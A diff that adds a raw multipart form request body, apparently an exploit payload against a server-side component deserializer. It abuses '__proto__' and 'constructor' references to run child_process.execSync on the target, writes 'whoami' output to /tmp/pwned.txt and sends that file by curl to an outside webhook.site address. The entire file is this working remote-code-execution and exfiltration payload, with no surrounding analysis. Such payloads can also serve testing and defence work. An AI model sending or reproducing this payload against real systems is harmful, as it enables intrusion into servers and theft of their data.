@@ -1,0 +1,9 @@
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('whoami > /tmp/pwned.txt && curl -X POST https://webhook.site/bd36e538-a851-4269-90a7-0e13facaefdc -d @/tmp/pwned.txt');","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
